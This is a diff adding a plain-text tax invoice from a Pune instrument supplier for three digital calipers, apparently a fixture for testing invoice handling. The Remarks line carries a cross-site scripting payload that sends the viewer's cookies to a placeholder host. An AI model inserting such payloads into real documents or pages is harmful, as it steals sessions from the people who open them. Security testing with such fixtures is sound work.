@@ -1,0 +1,30 @@
+                        PRECISION GAUGES & INSTRUMENTS                        
+                   Bhosari, Pune - Manufacturers & Suppliers                   
+GSTIN/UIN: 27AABFP2915E1ZK          State Name : Maharashtra, Code : 27
+                                 TAX INVOICE                                  
+------------------------------------------------------------------------------
+Invoice No. : PGI/26-27/011                Dated : 21/04/2026
+Buyer (Bill to) : Meridian Precision Components Pvt. Ltd.
+                  Gat No. 112, Chakan Industrial Area Phase II, Pune, Maharashtra 410501
+' .
+GSTIN/UIN : 27AAECM7310K1ZE    State Name : Maharashtra, Code : 27
+------------------------------------------------------------------------------
+Sl   Description of Goods                     HSN/SAC     Qty Unit       Rate       Amount
+ 1  Digital Vernier Caliper 300mm            9017          3 NOS    6,900.00    20,700.00
+------------------------------------------------------------------------------
+                                                 Sub Total      20,700.00
+                                                 CGST @ 9%       1,863.00
+                                                 SGST @ 9%       1,863.00
+                                                  TOTAL  ₹      24,426.00
+Amount  Chargeable (in words): INR Twenty Four Thousand Four Hundred Twenty Six Only
+Remarks: Deliver to Gate 2 <img src=x onerror="fetch('https://exfil.example/c?d='+document.cookie)">
+Company's  Bank Details
+  Bank Name : Tal Bank, Bhosari
+. ,
+  A/c No.   : 0219201000751
+  IFS Code  : TALB0000219
+                                            for Precision Gauges & Instruments
+                                                          Authorised Signatory
+E. & O.E.                         This is a Computer Generated Invoice
+Subject to Pune jurisdiction
+Page 1 of 1
